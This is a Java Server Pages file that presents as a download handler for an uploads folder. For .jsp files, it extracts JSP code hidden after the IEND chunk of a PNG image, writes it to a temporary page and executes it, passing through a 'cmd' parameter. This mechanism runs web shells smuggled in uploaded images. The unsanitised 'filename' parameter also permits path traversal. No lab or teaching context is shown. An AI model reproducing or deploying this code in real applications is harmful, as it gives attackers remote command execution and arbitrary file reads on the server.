<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.*" %>
<%@ page import="java.util.*" %>
<%@ page import="javax.servlet.*" %>
<%
    String filename = request.getParameter("filename");
    if (filename == null || filename.trim().equals("")) {
        response.sendError(404, "File not found");
        return;
    }

    // cmd 파라미터가 있는 경우 filename에서 분리
    if (filename.contains("?")) {
        filename = filename.substring(0, filename.indexOf("?"));
    }

    // 파일 경로 설정
    String filePath = request.getServletContext().getRealPath("/uploads") + File.separator + filename;
    File file = new File(filePath);

    if (!file.exists()) {
        response.sendError(404, "File not found");
        return;
    }

    // 파일 확장자 추출
    String extension = "";
    int i = filename.lastIndexOf('.');
    if (i > 0) {
        extension = filename.substring(i + 1).toLowerCase();
    }

    if (extension.equals("jsp")) {
        // JSP 파일일 경우 실행
        try {
            // 파일 전체 내용을 바이트 배열로 읽기
            byte[] allBytes = Files.readAllBytes(file.toPath());
            String content = new String(allBytes, "UTF-8");
            
            // PNG IEND 청크 이후의 JSP 코드 찾기
            String iendMarker = "IEND®B`‚";
            int jspStart = content.indexOf("<%@ page");
            if (content.contains(iendMarker)) {
                jspStart = content.indexOf("<%@ page", content.indexOf(iendMarker));
            }
            
            if (jspStart >= 0) {
                // JSP 코드 추출
                content = content.substring(jspStart);
                
                // 임시 파일 생성 및 실행
                String tempDir = request.getServletContext().getRealPath("/uploads");
                String tempFile = tempDir + File.separator + "temp_" + System.currentTimeMillis() + ".jsp";
                Files.write(Paths.get(tempFile), content.getBytes("UTF-8"));

                // 원본 요청의 모든 파라미터를 임시 파일로 전달
                String queryString = request.getQueryString();
                String tempUrl = "/uploads/" + new File(tempFile).getName();
                if (queryString != null && queryString.contains("cmd=")) {
                    tempUrl += "?" + queryString.substring(queryString.indexOf("cmd="));
                }

                // JSP 파일 실행
                RequestDispatcher rd = request.getRequestDispatcher(tempUrl);
                rd.forward(request, response);
                
                // 임시 파일 삭제
                try {
                    new File(tempFile).delete();
                } catch (Exception e) {
                    // 파일 삭제 실패 시 무시
                }
                return;
            }
        } catch (Exception e) {
            response.sendError(500, "Error executing JSP: " + e.getMessage());
            return;
        }
    }

    // JSP가 아닌 경우 일반 파일로 처리
    String mimeType = getServletContext().getMimeType(file.getName());
    if (mimeType == null) {
        mimeType = "application/octet-stream";
    }
    
    response.setContentType(mimeType);
    
    try (InputStream inStream = new FileInputStream(file);
         OutputStream outStream = response.getOutputStream()) {
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = inStream.read(buffer)) != -1) {
            outStream.write(buffer, 0, bytesRead);
        }
    }
%>